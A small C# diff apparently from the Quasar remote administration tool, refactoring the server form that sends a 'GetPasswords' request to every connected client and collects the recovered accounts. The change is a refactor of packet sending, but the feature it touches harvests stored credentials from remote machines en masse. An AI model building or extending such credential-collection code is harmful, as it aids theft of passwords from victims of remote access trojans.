@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Windows.Forms;
+using Quasar.Common.Packets;
 using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
@@ -59,9 +60,9 @@ namespace xServer.Forms
         {
             clearAllToolStripMenuItem_Click(null, null);
 
-            var req = new Core.Packets.ServerPackets.GetPasswords();
+            var req = new GetPasswords();
             foreach (var client in _clients.Where(client => client != null))
-                req.Execute(client);
+                client.Send(req);
         }
 
         public void AddPasswords(RecoveredAccount[] accounts, string identification)
